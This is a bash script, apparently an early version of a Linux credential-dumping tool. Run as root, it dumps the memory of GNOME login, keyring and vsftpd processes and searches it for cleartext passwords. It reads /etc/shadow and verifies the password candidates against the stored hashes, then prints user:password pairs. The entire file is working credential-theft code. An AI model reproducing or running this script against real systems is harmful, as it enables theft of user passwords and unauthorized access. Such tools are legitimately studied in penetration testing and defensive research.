#!/bin/bash

# Author: Hunter Gregal
# Github: /huntergregal
# Contribution from pugilist - PID extraction method 
# Dumps cleartext credentials from memory

#root check
if [[ $EUID -ne 0 ]]; then
	echo "Root required - You are dumping memory..."
	echo "Even mimikatz requires administrator"
	exit 1
fi

parse_pass ()
{
#If hash not in dump get shadow hashes
if [[ ! $2 ]]; then
        SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$.\$')"
fi

#$1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
#Determine password potential for each word
while read -r line; do
	#If hash in dump, prepare crypt line
	if [[ $2 ]]; then
		#get ctype
		CTYPE="$(echo $2 | cut -c-3)"
		#Escape quotes to pass into crypt
		SAFE="$(echo $line | sed 's/\"/\\"/g')"
		CRYPT="\"$SAFE\", \"$CTYPE$3\""
		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $2 ]]; then
			#Find which user's password it is (useful if used more than once!)
			USER="$(cat /etc/shadow | grep ${2} | cut -d':' -f 1)"
			echo "$4			$USER:$line"
		fi
	#Else use shadow hashes
	elif [[ $SHADOWHASHES ]]; then
		while read -r thishash; do
			CTYPE="$(echo $thishash | cut -c-3)"
			SHADOWSALT="$(echo $thishash | cut -d'$' -f 3)"
			#Escape quotes to pass into crypt
			SAFE="$(echo $line | sed 's/\"/\\"/g')"
			CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
			if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $thishash ]]; then
				#Find which user's password it is (useful if used more than once!)
				USER="$(cat /etc/shadow | grep ${thishash} | cut -d':' -f 1)"
				echo "$4			$USER:$line"
			fi
		done <<< "$SHADOWHASHES"
	#if no hash data - revert to checking probability
	else
		if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ ^LOGNAME= ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ UTF\-8 ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ ^splayManager[0-9]$ ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ ^gkr_system_authtok$ ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ Manager\.Worker ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ \/usr\/share ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ \/bin ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ \.so\.[0-1]$ ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ x86_64 ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ (aoao) ]]; then
			echo "[LOW]$4			$line"
		elif [[ $line =~ stuv ]]; then
			echo "[LOW]$4			$line"
		else
			echo "[HIGH]$4			$line"
		fi
	fi
done <<< "$1"
}

#If Kali
if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
        SOURCE="[SYSTEM - GNOME]"
        #get gdm-session-worker [pam/gdm-password] process
        PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
        gcore -o /tmp/dump $PID >& /dev/null
        HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
        SALT="$(echo $HASH | cut -d'$' -f 3)"
        DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
        DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
	parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
	
	#cleanup
	rm -rf "/tmp/dump.${PID}"
fi

#If Ubuntu
if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
        SOURCE="[SYSTEM - GNOME]"
        #get /usr/bin/gnome-keyring-daemon process
        PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
        gcore -o /tmp/dump $PID >& /dev/null
        HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
        SALT="$(echo $HASH | cut -d'$' -f 3)"
        DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
	parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
	
	#cleanup
	rm -rf "/tmp/dump.${PID}"
fi

#If Vsftpd 
if [[ -e "/etc/vsftpd.conf" ]]; then
        SOURCE="[SYSTEM - VSFTPD]"
        #get nobody /usr/sbin/vsftpd /etc/vsftpd.conf
        PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk 'BEGIN {FS = " " } ; { print $1 }')"
	#if exists aka someone logged into FTP then extract...
	if [[ $PID ]];then
		while read -r pid; do
		        gcore -o /tmp/dump $PID >& /dev/null
		        HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
		        SALT="$(echo $HASH | cut -d'$' -f 3)"
		        DUMP=$(strings "/tmp/dump.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
		
			#cleanup
			rm -rf "/tmp/dump.${pid}"
		done <<< $PID
	fi
fi

